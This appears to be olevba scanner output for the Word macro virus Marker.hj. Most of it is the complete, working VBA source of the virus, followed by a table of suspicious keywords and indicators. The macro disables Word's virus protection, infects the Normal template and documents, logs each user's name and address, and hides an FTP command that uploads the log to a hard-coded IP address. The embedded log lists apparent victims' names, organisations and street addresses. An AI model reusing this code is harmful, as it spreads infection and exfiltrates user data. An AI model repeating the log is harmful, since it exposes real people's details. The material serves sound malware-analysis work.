olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.hj-47db0abfef63cf95f25f82785293b85ec744969a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Marker.hj-47db0abfef63cf95f25f82785293b85ec744969a 
in file: Virus.MSWord.Marker.hj-47db0abfef63cf95f25f82785293b85ec744969a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 09:23:32 AM - Wednesday, 23 Dec 1998
' bcbsa
'



' 12:08:05 PM - Monday, 4 Jan 1999
' ISG
'



' 02:41:37 PM - Tuesday, 5 Jan 1999
' Information Systems Group
'



' 05:26:08 PM - Tuesday, 12 Jan 1999
' Information Systems
' CSC Healthcare
' 1675 Broadway, 18th Floor
' New York, NY 10019



' 11:11:28 PM - Tuesday, 26 Jan 1999
' Kinko's
'



' 01:55:18 PM - Tuesday, 2 Feb 1999
' Med97
'



' 06:12:19 PM - Wednesday, 3 Feb 1999
' Med98
'



' 08:14:55 PM - Wednesday, 3 Feb 1999
' Med94
'



' 10:09:31 AM - Friday, 5 Feb 1999
' Medical Student
'



' 02:05:18 PM - Friday, 5 Feb 1999
' Med98
'



' 07:03:00 PM - Monday, 8 Feb 1999
' Student Lounge
'



' 02:06:35 PM - Tuesday, 23 Feb 1999
' Ken Lem
'



' 04:34:46 PM - Tuesday, 23 Feb 1999
' Ken Lem
'



' 12:16:30 AM - Tuesday, 2 Mar 1999
' Ramez Ethnasios
'



' 02:29:57 PM - Wednesday, 24 Mar 1999
' SWAHBA
'



' 11:45:54 AM - Monday, 5 Apr 1999
' LMEI
'



' 12:54:06 PM - Friday, 14 May 1999
' KSUEN
'



' 09:44:46 AM - Monday, 31 May 1999
' chenyimin
'



' 05:52:26 PM - Sunday, 30 May 1999
'
'



' 09:49:21 AM - Thursday, 17 Jun 1999
' xkx
'



' 08:41:00 AM - Tuesday, 22 Jun 1999
' hxy
' �����к���������·��ʮ��8763����



' 02:59:39 PM - Tuesday, 22 Jun 1999
' aa
'



' 04:55:39 PM - Monday, 21 Jun 1999
' 46¥̨1128
'



' 03:13:34 PM - Tuesday, 22 Jun 1999
' Wei
'



' 09:24:56 PM - Sunday, 27 Jun 1999
' han
'



' 11:15:20 AM - Wednesday, 30 Jun 1999
' Wei
'



' 12:09:38 AM - Wednesday, 1 Jan 1997
'
'



' 01:07:48 AM - Wednesday, 1 Jan 1997
'
'



' 04:26:16 AM - Wednesday, 1 Jan 1997
'
'



' 12:01:58 AM - Wednesday, 1 Jan 1997
'
'



' 01:21:03 AM - Wednesday, 1 Jan 1997
'
'



' 02:02:10 AM - Wednesday, 1 Jan 1997
'
'



' 12:15:30 AM - Wednesday, 1 Jan 1997
'
'



' 03:54:54 AM - Wednesday, 1 Jan 1997
'
'



' 05:31:08 AM - Wednesday, 1 Jan 1997
'
'



' 03:45:52 AM - Wednesday, 1 Jan 1997
'
'



' 12:26:59 AM - Wednesday, 1 Jan 1997
'
'



' 06:12:39 PM - Friday, 8 Oct 1999
' Computer3
'



' 01:40:34 AM - Wednesday, 1 Jan 1997
'
'



' 06:05:43 PM - Monday, 18 Oct 1999
' Zhuo Jiachen
' Zhuo Jiachen
' Room 212, Bldg 29
' Peking University
' Beijing,100871, P.R.China



' 08:30:47 AM - Thursday, 21 Oct 1999
' 211
'



' 03:35:03 PM - Friday, 24 Sep 1999
' xuehong
'



' 10:09:27 PM - Sunday, 24 Oct 1999
' ��ʤ
'



' 01:40:38 PM - Wednesday, 1 Mar 2000
' yaolunzhan
'



' 04:29:06 PM - Friday, 10 Mar 2000
' yaolunzhan
'



' 05:23:16 PM - Monday, 20 Mar 2000
' yaolunzhan
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

